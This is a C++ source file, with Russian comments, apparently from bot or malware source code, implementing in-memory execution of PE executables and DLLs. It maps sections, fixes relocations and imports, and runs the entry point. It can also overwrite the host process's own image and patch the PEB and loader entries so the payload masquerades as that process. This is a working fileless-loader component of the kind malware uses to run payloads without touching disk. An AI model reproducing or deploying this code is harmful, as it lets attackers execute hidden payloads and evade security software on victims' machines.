#include "core\runinmem.h"
#include "core\pe.h"
#include "core\debug.h"

namespace RunInMem
{

typedef BOOL ( WINAPI *DllEntryProc )( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved );

#define IMAGE_SIZEOF_BASE_RELOCATION         8
#define GET_HEADER_DICTIONARY( module, idx ) &(module)->headers->OptionalHeader.DataDirectory[idx]

typedef DWORD (*typeFuncRun)( const void*, int );

void CopySections( void* imageBase, const void* data );
void FinalizeSections( void* imageBase, DWORD thisProtect );
int EndModule(void);

//запуск файла в отдельно выделенном участке памяти
HMODULE RunNormal( const void* data, int szData );
//запуск файла поверх текущего процесса
HMODULE RunOverlay( const void* data, int szData );
//инициализирует файл в памяти imageBase и запускает файл
HMODULE InitAndRun( void* imageBase, const void* data, int szData, void* thirdParam );
void SetImageBase( void* imageBase, PIMAGE_NT_HEADERS headers );
void End();

bool RunExe( const void* data, int szData ) 
{
	HMODULE imageProcess = PE::GetImageBaseProcess();
	HMODULE imageBot = PE::GetImageBase();
	PIMAGE_NT_HEADERS headerProcess = PE::GetNTHeaders(imageProcess);
	PIMAGE_NT_HEADERS headerData = PE::GetNTHeaders( (HMODULE)data );
	PIMAGE_NT_HEADERS headerBot = PE::GetNTHeaders(imageBot);
	if( headerData->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress == 0 )
	{
		if( (ADDR)imageProcess != headerData->OptionalHeader.ImageBase )
			return RunNormal( data, szData ) != 0;
		else
			return RunOverlay( data, szData ) != 0;
	}
	else
	{
		return RunDll( data, szData, 0 ) != 0;
	}
}

HMODULE RunDll( const void* module, int szModule, void* thirdParam )
{
	PIMAGE_NT_HEADERS headerData = PE::GetNTHeaders( (HMODULE)module );
	HMODULE imageBase = (HMODULE)API(KERNEL32, VirtualAlloc)( 0, headerData->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
	if( imageBase )
	{
		return InitAndRun( imageBase, module, szModule, thirdParam );
	}
	return 0;
}

void FreeDll( HMODULE module )
{
	if( !module ) return;
	DllEntryProc entryFunc;
	PIMAGE_NT_HEADERS headers = PE::GetNTHeaders( (HMODULE)module );
	if( headers->OptionalHeader.AddressOfEntryPoint != 0 )
	{
		entryFunc = (DllEntryProc)((SIZE_T)module + headers->OptionalHeader.AddressOfEntryPoint);
		entryFunc( (HINSTANCE)module, DLL_PROCESS_DETACH, 0 );
	}
	API(KERNEL32, VirtualFree)( module, 0, MEM_RELEASE );
}

HMODULE RunOverlay( const void* data, int szData )
{
	HMODULE imageProcess = PE::GetImageBaseProcess();
	PIMAGE_NT_HEADERS headerProcess = PE::GetNTHeaders(imageProcess);
	PIMAGE_NT_HEADERS headerData = PE::GetNTHeaders( (HMODULE)data );

	DWORD oldProtect;
	API(KERNEL32, VirtualProtect)( (void*)imageProcess, sizeof(PIMAGE_DOS_HEADER) + sizeof(PIMAGE_NT_HEADERS), PAGE_READWRITE, &oldProtect );
	FinalizeSections( imageProcess, PAGE_READWRITE );
	if( headerProcess->OptionalHeader.SizeOfImage < headerData->OptionalHeader.SizeOfImage )
	{
		API(KERNEL32, UnmapViewOfFile)( imageProcess );
		API(KERNEL32, VirtualFree)( imageProcess, 0, MEM_RELEASE );
		API(KERNEL32, VirtualAlloc)( imageProcess, headerData->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
	}
	return InitAndRun( imageProcess, data, szData, 0 );
}

HMODULE RunNormal( const void* data, int szData )
{
	MEMORY_BASIC_INFORMATION mai;
	PIMAGE_NT_HEADERS headerData = PE::GetNTHeaders( (HMODULE)data );
	//смотрим занята ли памяти по базе образа, если занята, то освобождаем и выделям для образа и выделяем заново ту что была занята, но уже меньшего размера
	API(KERNEL32, VirtualQuery)( (void*)headerData->OptionalHeader.ImageBase, &mai, sizeof(MEMORY_BASIC_INFORMATION) );
	API(KERNEL32, UnmapViewOfFile)( (void*)headerData->OptionalHeader.ImageBase );
	API(KERNEL32, VirtualFree)( (void*)headerData->OptionalHeader.ImageBase, 0, MEM_RELEASE );
	API(KERNEL32, UnmapViewOfFile)( mai.AllocationBase );
	API(KERNEL32, VirtualFree)( mai.AllocationBase, 0, MEM_RELEASE );
	HMODULE imageBase = (HMODULE)API(KERNEL32, VirtualAlloc)( (void*)headerData->OptionalHeader.ImageBase, headerData->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
	if( imageBase )
	{
		API(KERNEL32, VirtualAlloc)( mai.AllocationBase, headerData->OptionalHeader.ImageBase - (DWORD)mai.AllocationBase, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE );
		return InitAndRun( imageBase, data, szData, 0 );
	}
	return imageBase;
}

void SetImageBase( void* imageBase, PIMAGE_NT_HEADERS headers )
{
	PPEB peb = WinAPI::GetPEB();
	peb->ImageBaseAddress = (HANDLE)imageBase;
	PPEB_LDR_DATA pldr = peb->Ldr;
	PLDR_DATA_TABLE_ENTRY pentry = (PLDR_DATA_TABLE_ENTRY) pldr->ModuleListLoadOrder.Flink;
	pentry->DllBase = (HANDLE)imageBase;
}

HMODULE InitAndRun( void* imageBase, const void* data, int szData, void* thirdParam )
{
	DllEntryProc entryFunc;
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)data;
	PIMAGE_NT_HEADERS header = PE::GetNTHeaders((HMODULE)data);
	Mem::Set( imageBase, 0, header->OptionalHeader.SizeOfImage );
	Mem::Copy( imageBase, data, dosHeader->e_lfanew + header->OptionalHeader.SizeOfHeaders );

	PIMAGE_NT_HEADERS headers = PE::GetNTHeaders( (HMODULE)imageBase );

	CopySections( imageBase, data );

	SIZE_T locationDelta = (SIZE_T)((SIZE_T)imageBase - header->OptionalHeader.ImageBase);
	if( locationDelta != 0 )
		PE::ProcessRelocs( (PIMAGE_BASE_RELOCATION)((SIZE_T)imageBase + headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress),
							(SIZE_T)imageBase, locationDelta, headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size );

	HMODULE ret = 0;
	if( WinAPI::BuildImportTable( (HMODULE)imageBase, API(KERNEL32, LoadLibraryA), (typeGetProcAddress)API(KERNEL32, GetProcAddress) ) )
	{
		FinalizeSections( imageBase, 0 );
		if( headers->OptionalHeader.AddressOfEntryPoint != 0 )
		{

			entryFunc = (DllEntryProc)((SIZE_T)imageBase + headers->OptionalHeader.AddressOfEntryPoint);
			if( entryFunc )
			{
				if( headers->FileHeader.Characteristics & IMAGE_FILE_DLL )
				{
					if( (*entryFunc)( (HINSTANCE)imageBase, DLL_PROCESS_ATTACH, thirdParam ) )
					{
						ret = (HMODULE)imageBase;
					}
				}
				else
				{
					SetImageBase( imageBase, headers );
					//__asm int 3;
					DbgMsg( "Запущен в памяти образ %08x", imageBase );
					(*entryFunc)( (HINSTANCE)imageBase, -1, 0 );
					API(KERNEL32, ExitProcess)(0);
				}
			}
		}
	}
	return ret;
}

#define IMAGE_FIRST_SECTION(ntheader) ((PIMAGE_SECTION_HEADER) ((ULONG_PTR)ntheader + FIELD_OFFSET(IMAGE_NT_HEADERS,OptionalHeader) + ((PIMAGE_NT_HEADERS)(ntheader))->FileHeader.SizeOfOptionalHeader))

void CopySections( void* imageBase, const void* data )
{
	PIMAGE_NT_HEADERS headers = PE::GetNTHeaders( (HMODULE)data );
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(headers);

	for( int i = 0; i < headers->FileHeader.NumberOfSections; i++, section++ )
	{
		if ( section->SizeOfRawData > 0 )
		{
			void* dst = (void*)((SIZE_T)imageBase + section->VirtualAddress); 
			Mem::Copy( dst, (byte*)data + section->PointerToRawData, section->SizeOfRawData );
		}
	}
}

void FinalizeSections( void* imageBase, DWORD thisProtect )
{
	PIMAGE_NT_HEADERS headers = PE::GetNTHeaders( (HMODULE)imageBase );
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(headers);

	for( int i = 0; i < headers->FileHeader.NumberOfSections; i++, section++ )
	{
		DWORD protect, oldProtect, size;

		size = section->SizeOfRawData;

		if( thisProtect == 0 )
		{
			protect = PAGE_NOACCESS;
			switch( section->Characteristics & (IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE) )
			{
				case IMAGE_SCN_MEM_WRITE: protect = PAGE_WRITECOPY; break;
				case IMAGE_SCN_MEM_READ: protect = PAGE_READONLY; break;
				case IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ: protect = PAGE_READWRITE; break;
				case IMAGE_SCN_MEM_EXECUTE: protect = PAGE_EXECUTE; break;
				case IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE: protect = PAGE_EXECUTE_WRITECOPY; break;
				case IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ: protect = PAGE_EXECUTE_READ; break;
				case IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ: protect = PAGE_EXECUTE_READWRITE; break;
			}

			if ( section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED )
				protect |= PAGE_NOCACHE;
			
			if ( size == 0 )
			{
				if ( section->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA )
				{
					size = headers->OptionalHeader.SizeOfInitializedData;
				}
				else if ( section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA )
				{
					size = headers->OptionalHeader.SizeOfUninitializedData;
				}
			}
		}
		else
			protect = thisProtect;

		if ( size > 0 )
			API(KERNEL32, VirtualProtect)( (LPVOID)((ADDR)imageBase + section->VirtualAddress), section->Misc.VirtualSize, protect, &oldProtect );
	}
}

}
